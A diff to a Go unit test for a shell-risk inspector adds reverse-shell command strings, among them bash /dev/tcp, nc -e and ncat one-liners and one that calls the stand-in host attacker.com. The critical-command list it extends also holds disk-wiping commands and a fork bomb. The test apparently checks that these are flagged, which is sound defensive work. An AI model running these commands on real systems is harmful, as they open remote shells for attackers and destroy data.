@@ -234,6 +234,11 @@ func TestInspectShellRisk(t *testing.T) {
 		"mkfs.ext4 /dev/sda1",
 		"dd if=/dev/zero of=/dev/nvme0n1",
 		":(){ :|:& };:",
+		"bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+		"sh -i >& /dev/udp/attacker.com/4444 0>&1",
+		"nc -e /bin/sh 10.0.0.1 4444",
+		"ncat -e /bin/bash 192.168.1.5 9001",
+		"netcat 10.0.0.1 4444 -c /bin/bash",
 	}
 	for _, cmd := range criticalCmds {
 		risk := regulator.InspectShellRisk(workDir, cmd)
